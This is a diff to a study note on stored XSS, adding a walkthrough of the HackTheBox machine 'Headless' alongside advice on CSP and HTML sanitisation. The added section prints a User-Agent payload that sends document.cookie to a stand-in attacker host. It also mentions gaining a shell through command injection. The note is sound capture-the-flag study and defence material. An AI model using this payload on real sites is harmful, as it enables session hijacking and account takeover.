@@ -1,6 +1,6 @@
 ---
 topic: Stored XSS — stealing the administrator cookie
-tags: [web, xss, cookies, admin-bot, imagery]
+tags: [web, xss, cookies, admin-bot, imagery, headless]
 ---
 
 # Stored XSS — stealing the administrator cookie
@@ -63,6 +63,16 @@ In the browser: DevTools → Application → Cookies → replace the value and r
 - Implement CSP with nonces and no `unsafe-inline`.
 - Sanitise HTML with an allowlist (DOMPurify) if formatting is allowed.
 - Review content on an isolated domain.
+
+## Real-world case: Headless
+
+The `headless.htb` contact form reflects HTML and warns that request headers are forwarded for analysis. The XSS is not in the body but in `User-Agent`:
+
+```http
+User-Agent: <script>fetch('http://<ATTACKER>/?c='+document.cookie)</script>
+```
+
+When the administrator reviews the inquiry, the script runs, the cookie reaches the listener and the dashboard opens. There a diagnostic form with command injection gives the shell. The lesson is twofold: any header stored and displayed in the panel is an XSS field, and the stolen cookie can open surface with more privileges than the initial one. In *Beyond Root*, 0xdf decodes and modifies the cookie, a reminder that a session cookie readable by JavaScript is enough to escalate inside the application.
 
 ## Detection
 
